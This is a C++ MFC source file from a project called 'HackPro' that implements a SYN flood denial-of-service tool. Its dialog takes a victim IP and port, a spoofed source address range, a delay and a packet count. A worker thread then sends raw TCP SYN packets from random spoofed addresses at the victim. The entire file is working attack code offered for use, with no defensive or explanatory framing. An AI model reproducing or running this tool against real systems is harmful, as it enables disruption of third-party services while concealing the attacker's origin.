// SynAttackDlg.cpp : implementation file
//

#include "stdafx.h"
#include "HackPro.h"
#include "SynAttackDlg.h"
#include "NetSocket.h"


// CSynAttackDlg dialog

IMPLEMENT_DYNAMIC(CSynAttackDlg, CDialog)
CSynAttackDlg::CSynAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSynAttackDlg::IDD, pParent)
{
}

CSynAttackDlg::~CSynAttackDlg()
{
}

void CSynAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_IPADDRESS1, m_victimIP);
	DDX_Control(pDX, IDC_VICTIMPORT, m_victimsport);
	DDX_Control(pDX, IDC_IP1, m_IP1);
	DDX_Control(pDX, IDC_IP2, m_IP2);
	DDX_Control(pDX, IDC_SRCPORT, m_port);
	DDX_Control(pDX, IDC_DELAY, m_delay);
	DDX_Control(pDX, IDC_PROGRESS1, m_Progress);
	DDX_Control(pDX, IDC_NUMOFPACKETS, m_Delay);
}


BEGIN_MESSAGE_MAP(CSynAttackDlg, CDialog)
	ON_BN_CLICKED(IDC_START, OnBnClickedStart)
END_MESSAGE_MAP()


// CSynAttackDlg message handlers

void CSynAttackDlg::OnBnClickedStart()
{
	//Begin the sender therd that will send the packets for DOS.
	AfxBeginThread(CSynAttackDlg::SndThrd,(LPVOID)this);
}
UINT CSynAttackDlg::SndThrd(LPVOID PARAM)
{
	CSynAttackDlg* This=(CSynAttackDlg*)PARAM;
	This->m_Progress.SetRange(0,100);
	This->m_Progress.ShowWindow(SW_SHOW);

	//get the IPs
	DWORD VIP,IP1,IP2,DIFF;
	This->m_victimIP.GetAddress(VIP);
	This->m_IP1.GetAddress(IP1);
	This->m_IP2.GetAddress(IP2);
	DIFF=IP2-IP1;
	
	//get the ports
	unsigned short vport,port;
	vport=This->GetDlgItemInt(IDC_VICTIMPORT);
	port=This->GetDlgItemInt(IDC_SRCPORT);

	//get the delay and NoOfPackets
	int delay=This->GetDlgItemInt(IDC_DELAY);
	int NoOfPackets=This->GetDlgItemInt(IDC_NUMOFPACKETS);

	//Initilaize the socket
	CNetSocket sock;
	sock.InitSocket(0);
	sock.SetOpt();
	srand(IP2-IP1);

	//Set some parameters before the loop
	PacketParam p;
	p.destination=VIP;
	p.port=vport;
	p.ttl=128;
	for(int i=0;i<NoOfPackets;i++)
	{
		//Get the random ip from given range
		This->m_Progress.SetPos(i%100);
		int Rnd=rand();
		DWORD ip=Rnd%DIFF+IP1;
		int seq=rand();
		seq=seq%500; //let the sequence number between 0 to 499
		
		//set parameters;
		p.source=ip;
		int b=sock.SendTCPPacket(p,vport,TCPFLAG_SYN,port,seq);
		if(b<=0)
		{
			break;
		}
		
		/*in_addr a;
		a.S_un.S_addr=htonl(ip);

		CString msg;
		msg.Format("IP=%s, seq=%d",inet_ntoa(a),seq);
		::MessageBox(NULL,msg,NULL,NULL);*/
		
        Sleep(delay);
	}
	This->m_Progress.ShowWindow(SW_HIDE);
	return 1;
}
